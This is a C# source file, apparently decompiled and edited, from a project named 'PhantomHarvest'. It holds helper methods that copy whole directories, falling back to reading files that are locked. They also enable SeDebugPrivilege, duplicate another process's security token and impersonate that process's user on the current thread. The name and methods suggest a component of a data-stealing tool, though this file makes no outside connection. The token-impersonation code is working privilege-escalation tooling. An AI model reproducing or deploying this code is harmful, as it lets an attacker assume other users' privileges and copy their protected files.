using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Management;

namespace PhantomHarvest.Helper
{
	// Token: 0x02000029 RID: 41
	internal class Methods
	{
		// Token: 0x060000F6 RID: 246 RVA: 0x0000A918 File Offset: 0x00008B18
		public static void CopyDirectory(string sourceDir, string destinationDir, bool recursive)
		{
			DirectoryInfo directoryInfo = new DirectoryInfo(sourceDir);
			if (!directoryInfo.Exists)
			{
				throw new DirectoryNotFoundException("Source directory not found: " + directoryInfo.FullName);
			}
			DirectoryInfo[] directories = directoryInfo.GetDirectories();
			Directory.CreateDirectory(destinationDir);
			foreach (FileInfo fileInfo in directoryInfo.GetFiles())
			{
				string path = Path.Combine(destinationDir, fileInfo.Name);
				try
				{
					File.WriteAllBytes(path, File.ReadAllBytes(fileInfo.FullName));
				}
				catch
				{
					byte[] array = LockedFile.ReadLockedFile(fileInfo.FullName);
					if (array != null)
					{
						File.WriteAllBytes(path, array);
					}
				}
			}
			if (recursive)
			{
				foreach (DirectoryInfo directoryInfo2 in directories)
				{
					string destinationDir2 = Path.Combine(destinationDir, directoryInfo2.Name);
					Methods.CopyDirectory(directoryInfo2.FullName, destinationDir2, true);
				}
			}
		}

		// Token: 0x060000F7 RID: 247 RVA: 0x0000AA00 File Offset: 0x00008C00
		public static string GetProcessUserName(int pID)
		{
			string result = null;
			ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(new SelectQuery("Select * from Win32_Process WHERE processID=" + pID.ToString()));
			try
			{
				using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = managementObjectSearcher.Get().GetEnumerator())
				{
					if (enumerator.MoveNext())
					{
						ManagementObject managementObject = (ManagementObject)enumerator.Current;
						ManagementBaseObject methodParameters = managementObject.GetMethodParameters("GetOwner");
						result = managementObject.InvokeMethod("GetOwner", methodParameters, null)["User"].ToString();
					}
				}
			}
			catch
			{
				result = "SYSTEM";
			}
			return result;
		}

		// Token: 0x060000F8 RID: 248 RVA: 0x0000AAAC File Offset: 0x00008CAC
		public static bool ImpersonateProcessToken(int pid)
		{
			// 尝试启用 SeDebugPrivilege
			try
			{
				IntPtr hCurrentToken;
				if (Win32Api.OpenProcessToken(Win32Api.GetCurrentProcess(), 0x0020 | 0x0008, out hCurrentToken)) // TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY
				{
					long luid;
					if (Win32Api.LookupPrivilegeValue(null, Win32Api.SE_DEBUG_NAME, out luid))
					{
						Win32Api.TOKEN_PRIVILEGES tp = new Win32Api.TOKEN_PRIVILEGES
						{
							PrivilegeCount = 1,
							Luid = luid,
							Attributes = Win32Api.SE_PRIVILEGE_ENABLED
						};
						if (!Win32Api.AdjustTokenPrivileges(hCurrentToken, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero))
						{
							Console.WriteLine("[DEBUG] AdjustTokenPrivileges 失败: " + Marshal.GetLastWin32Error());
						}
						else
						{
							// 检查 GetLastError 确认是否真的成功（AdjustTokenPrivileges 即使部分成功也会返回 true）
							int error = Marshal.GetLastWin32Error();
							if (error != 0)
								Console.WriteLine("[DEBUG] AdjustTokenPrivileges 可能部分失败, Error: " + error);
							// else
							// 	Console.WriteLine("[DEBUG] SeDebugPrivilege 启用成功");
						}
					}
					else
					{
						Console.WriteLine("[DEBUG] LookupPrivilegeValue 失败");
					}
					Win32Api.CloseHandle(hCurrentToken);
				}
				else
				{
					Console.WriteLine("[DEBUG] OpenProcessToken(Current) 失败");
				}
			}
			catch (Exception ex)
			{
				// Console.WriteLine("[DEBUG] 提权过程异常: " + ex.Message);
			}

			// 尝试打开目标进程
			IntPtr intPtr = Win32Api.OpenProcess(Win32Api.PROCESS_ACCESS_FLAGS.PROCESS_QUERY_INFORMATION, true, pid);
			if (intPtr == IntPtr.Zero)
			{
				int error = Marshal.GetLastWin32Error();
				// Console.WriteLine("[DEBUG] OpenProcess(QUERY_INFO) 失败, Error: " + error + "。尝试 QUERY_LIMITED_INFO...");
				
				// Fallback: 尝试 PROCESS_QUERY_LIMITED_INFORMATION (0x1000)
				intPtr = Win32Api.OpenProcess(Win32Api.PROCESS_ACCESS_FLAGS.PROCESS_QUERY_LIMITED_INFORMATION, true, pid);
				if (intPtr == IntPtr.Zero)
				{
					Console.WriteLine("[DEBUG] OpenProcess(LIMITED_INFO) 也失败, Error: " + Marshal.GetLastWin32Error());
					return false;
				}
			}

			IntPtr existingTokenHandle;
			if (!Win32Api.OpenProcessToken(intPtr, 6U, out existingTokenHandle)) // TOKEN_DUPLICATE | TOKEN_QUERY = 6
			{
				Console.WriteLine("[DEBUG] OpenProcessToken(Target) 失败, Error: " + Marshal.GetLastWin32Error());
				Win32Api.CloseHandle(intPtr);
				return false;
			}
			
			IntPtr hToken = IntPtr.Zero;
			bool result = Win32Api.DuplicateToken(existingTokenHandle, 2, ref hToken); // SecurityImpersonation = 2
			if (!result)
			{
				// Console.WriteLine("[DEBUG] DuplicateToken 失败, Error: " + Marshal.GetLastWin32Error());
			}
			else
			{
				if (!Win32Api.SetThreadToken(IntPtr.Zero, hToken))
				{
					// Console.WriteLine("[DEBUG] SetThreadToken 失败, Error: " + Marshal.GetLastWin32Error());
					result = false;
				}
			}
			
			Win32Api.CloseHandle(existingTokenHandle);
			Win32Api.CloseHandle(intPtr);
			
			return result;
		}
	}
}
